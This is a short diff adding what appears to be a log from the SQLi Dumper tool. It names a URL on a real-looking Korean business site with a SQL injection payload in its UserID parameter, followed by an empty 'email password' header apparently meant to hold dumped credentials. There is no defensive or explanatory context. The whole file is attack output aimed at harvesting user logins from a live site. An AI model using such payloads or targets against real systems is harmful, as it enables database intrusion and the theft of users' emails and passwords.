@@ -1,0 +1,6 @@
+6/15/2020 6:51:45 AM
+SQLi Dumper v.8.2
+http://www.b2bhub.co.kr/B2bMini/skin_02/Story.asp?UserID=wooilcaster' or 1=[t] and '1'='1
+
+email	password
+	
